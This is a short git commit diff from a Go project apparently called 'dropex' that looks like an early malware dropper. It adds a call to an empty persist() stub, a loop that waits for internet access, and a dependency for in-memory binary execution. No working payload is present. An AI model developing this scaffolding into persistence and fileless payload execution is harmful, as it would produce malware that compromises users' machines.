881e2bf7cc463eaa8a157d6ecc56f382505ff885
Nemuel Wainaina <bR0S3@protonmail.com>
2023-03-21 12:34:17 +0300

    Add package

--- dropex.go
+++ dropex.go
@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"time"
 )
 
 const (
@@ -11,10 +12,14 @@ const (
 
 func main() {
 	fmt.Println("Hello friend")
+	persist()
+	for !has_internet_access() {
+		time.Sleep(time.Minute)
+	}
 }
 
 func persist() {
-	
+
 }
 
 func has_internet_access() bool {
--- go.mod
+++ go.mod
@@ -2,4 +2,7 @@ module dropex
 
 go 1.19
 
-require golang.org/x/sys v0.5.0 // indirect
+require (
+	github.com/amenzhinsky/go-memexec v0.7.1 // indirect
+	golang.org/x/sys v0.5.0 // indirect
+)
